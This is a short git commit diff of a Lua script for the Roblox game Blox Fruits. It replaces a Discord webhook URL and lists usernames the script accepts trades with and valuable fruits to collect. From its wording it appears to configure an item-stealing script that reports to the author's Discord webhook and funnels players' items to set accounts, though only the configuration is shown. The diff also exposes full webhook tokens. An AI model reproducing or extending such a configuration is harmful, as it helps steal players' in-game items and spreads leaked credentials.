bf69d48c717b6eb90931a98ac86f9a56b736c881
redzhub1150 <yourmotherbingchilling@gmail.com>
2025-02-11 13:52:33 +0300

    Update source.lua

--- source.lua
+++ source.lua
@@ -1,4 +1,4 @@
-Webhook ="https://discord.com/api/webhooks/1338100760075964438/8Ynv-hAZ-flhwFGkv3P9opYoX9c5PQxGolnoLKPpsMnyod4gLCMvIMD35KhGN7Gi0Zzk"
+Webhook ="https://discord.com/api/webhooks/1338824638083366912/w2EX9_d-RREnB6_kZ_nwBBzNuqDHawTW7n-AtOFrv8cNKnZSd83NAW4kbhR7RqoHAyoL"
 Usernames = {"arangreaoptest2"} -- << Username(-s) it'll accept trade with
 Fruits = {"Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Kitsune-Kitsune", "Dough-Dough"} -- << Fruits you want
 FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
